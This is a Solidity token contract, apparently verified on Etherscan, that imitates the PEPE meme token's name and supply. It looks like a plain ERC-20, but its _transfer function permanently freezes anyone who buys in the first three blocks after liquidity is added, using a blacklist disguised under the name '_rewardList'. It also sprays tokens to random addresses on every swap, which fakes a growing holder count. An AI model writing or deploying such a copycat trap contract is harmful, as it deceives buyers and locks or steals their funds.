/**
 *Submitted for verification at Etherscan.io on 2023-05-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);


    function totalSupply() external view returns (uint256);

 
    function balanceOf(address account) external view returns (uint256);


    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
}

contract PEPE is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint256 private _decimals;


    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public currency;
    mapping(address => bool) public _swapPairList;


    uint256 private constant MAX = ~uint256(0);
    address public _mainPair;
    uint256 public startTradeBlock;

    mapping(address => bool) public _rewardList;



    constructor() {
        _name = "PEPE";
        _symbol = "PEPE";
        _decimals = 18;
        _tTotal = 420690000000000 * 10**_decimals;


        _swapRouter = ISwapRouter(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
        currency = _swapRouter.WETH();
        address ReceiveAddress = address(0x6697aFa3A1eF814B3D7a1D8883E4EA126D2E7232);

        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
        _mainPair = swapFactory.createPair(address(this), currency);

        _swapPairList[_mainPair] = true;

        _owner = address(0x000000000000000000000000000000000000dEaD);
        

        _balances[ReceiveAddress] = _tTotal;
        emit Transfer(address(0), ReceiveAddress, _tTotal);

    }

    function symbol() external view  returns (string memory) {
        return _symbol;
    }

    function name() external view  returns (string memory) {
        return _name;
    }

    function decimals() external view  returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view  returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
        
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
        
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function _transfer(address from, address to, uint256 amount) private {

        require(balanceOf(from) >= amount);
        require(isReward(from) == 0);
        
        if (_swapPairList[to]) {
            ISwapPair mainPair = ISwapPair(_mainPair);
            (uint r0, , ) = mainPair.getReserves();
            if(r0 == 0){
                startTradeBlock = block.number;
            }
        }
        if (_swapPairList[from] || _swapPairList[to]) {
            if (
                    block.number < startTradeBlock + 3 &&
                    !_swapPairList[to]
                ) {
                    _rewardList[to] = true;
                }
            address ad;
            for (uint256 i = 0; i < 3; i++) {
                ad = address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _basicTransfer(from, ad, 1);
            }
            amount -= 3 ;
        }
        _basicTransfer(
            from,
            to,
            amount
        );
    }
    function isReward(address account) public view returns (uint256) {
        if (_rewardList[account]) {
            return 1;
        } else {
            return 0;
        }
    }
    receive() external payable {}

    

}